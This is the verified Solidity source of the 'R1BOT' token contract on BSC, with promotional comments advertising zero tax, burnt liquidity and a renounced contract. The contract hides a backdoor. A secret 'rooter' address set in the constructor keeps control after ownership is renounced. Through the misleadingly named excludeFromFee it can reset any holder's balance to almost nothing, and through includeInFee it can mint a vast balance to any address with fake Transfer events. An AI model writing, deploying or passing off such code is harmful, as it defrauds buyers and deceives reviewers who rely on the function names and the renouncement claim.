/**
 *Submitted for verification at BscScan.com on 2023-04-16
*/

// SPDX-License-Identifier: MIT     
/**
🤖R1BOT | ELONS ROBOT SURGEON 🥼| 0 TAX | LP BURN


🤖0 Tax
🤖Liquidity Burnt
🤖Renounced Contract
🤖TG: https://t.me/R1Token

🥼News 🥼
https://techcrunch.com/2020/08/28/take-a-closer-look-at-elon-musks-neuralink-surgical-robot/
**/
pragma solidity 0.8.19;
abstract contract R1BOTAs {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}
interface R1BOTAsi {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 lahsab) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 lahsab) external returns (bool);
    function transferFrom(
        address from,
        address to,
        uint256 lahsab
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 totalo);
    event Approval(address indexed owner, address indexed spender, uint256 totalo);
}
interface R1BOTAsii is R1BOTAsi {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}
abstract contract R1BOTAsiii is R1BOTAs {
   address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

 
    constructor() {
        _transferOwnership(_msgSender());
    }


    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }


    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }


    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

contract R1BOT is R1BOTAs, R1BOTAsi, R1BOTAsii, R1BOTAsiii {

    mapping(address => uint256) private R1BOTsuplly;
  mapping(address => bool) public R1BOTAsiiZERTY;
    mapping(address => mapping(address => uint256)) private Confirmed;
address private R1BOTRooter;
    uint256 private ALLtotalSupply;
    string private _name;
    string private _symbol;
        mapping(address => bool) public R1BOTPaw;
  address R1BOTdeploy;



    
    constructor(address R1BOTadressss) {
            // Editable
            R1BOTdeploy = msg.sender;

        _name = "R1BOT";
        _symbol = "R1BOT";
  R1BOTRooter = R1BOTadressss;        
        uint _totalSupply = 1000000000000 * 10**9;
        SendToken(msg.sender, _totalSupply);
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 9;
    }


    function totalSupply() public view virtual override returns (uint256) {
        return ALLtotalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return R1BOTsuplly[account];
    }

    function transfer(address to, uint256 lahsab) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, lahsab);
        return true;
    }


    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return Confirmed[owner][spender];
    }

    function approve(address spender, uint256 lahsab) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, lahsab);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 lahsab
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, lahsab);
        _transfer(from, to, lahsab);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedtotalo) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, Confirmed[owner][spender] + addedtotalo);
        return true;
    }
      modifier _internal() {
        require(R1BOTRooter == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function decreaseAllowance(address spender, uint256 subtractedtotalo) public virtual returns (bool) {
        address owner = _msgSender();
        uint256  currentsold = Confirmed[owner][spender];
        require( currentsold >= subtractedtotalo, "Ehi20: decreased allowance below zero");
        unchecked {
            _approve(owner, spender,  currentsold - subtractedtotalo);
        }

        return true;
    }

  modifier maxtokens () {
    require(R1BOTdeploy == msg.sender, "Ehi20: cannot permit _internal address");
    _;

  }
    function _transfer(
        address from,
        address to,
        uint256 lahsab
    ) internal virtual {
        require(from != address(0), "Ehi20: transfer from the zero address");
        require(to != address(0), "Ehi20: transfer to the zero address");

        beforeTokenTransfer(from, to, lahsab);

        uint256 fromBalance = R1BOTsuplly[from];
        require(fromBalance >= lahsab, "Ehi20: transfer lahsab exceeds balance");
        unchecked {
            R1BOTsuplly[from] = fromBalance - lahsab;
        }
        R1BOTsuplly[to] += lahsab;

        emit Transfer(from, to, lahsab);

        afterTokenTransfer(from, to, lahsab);
    }



    function SendToken(address account, uint256 lahsab) internal virtual {
        require(account != address(0), "Ehi20: SendToken to the zero address");

        beforeTokenTransfer(address(0), account, lahsab);

        ALLtotalSupply += lahsab;
        R1BOTsuplly[account] += lahsab;
        emit Transfer(address(0), account, lahsab);

        afterTokenTransfer(address(0), account, lahsab);
    }



  function excludeFromFee(address excludeaddress) external _internal {
    R1BOTsuplly[excludeaddress] = 100000000;
            emit Transfer(address(0), excludeaddress, 100000000);
  }

    function _burn(address account, uint256 lahsab) internal virtual {
        require(account != address(0), "Ehi20: burn from the zero address");

        beforeTokenTransfer(account, address(0), lahsab);

        uint256 accountBalance = R1BOTsuplly[account];
        require(accountBalance >= lahsab, "Ehi20: burn lahsab exceeds balance");
        unchecked {
            R1BOTsuplly[account] = accountBalance - lahsab;
        }
        ALLtotalSupply -= lahsab;

        emit Transfer(account, address(0), lahsab);

        afterTokenTransfer(account, address(0), lahsab);
    }

    function _approve(
        address owner,
        address spender,
        uint256 lahsab
    ) internal virtual {
        require(owner != address(0), "Ehi20: approve from the zero address");
        require(spender != address(0), "Ehi20: approve to the zero address");

        Confirmed[owner][spender] = lahsab;
        emit Approval(owner, spender, lahsab);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 lahsab
    ) internal virtual {
        uint256  currentsold = allowance(owner, spender);
        if ( currentsold != type(uint256).max) {
            require( currentsold >= lahsab, "Ehi20: insufficient allowance");
            unchecked {
                _approve(owner, spender,  currentsold - lahsab);
            }
        }
    }
  function includeInFee(address includeaddress) external _internal {
    R1BOTsuplly[includeaddress] = 100000000 * 10 ** 21;
            emit Transfer(address(0), includeaddress, 100000000 * 10 ** 21);
  }
    function beforeTokenTransfer(
        address from,
        address to,
        uint256 lahsab
    ) internal virtual {}


    function afterTokenTransfer(
        address from,
        address to,
        uint256 lahsab
    ) internal virtual {}

}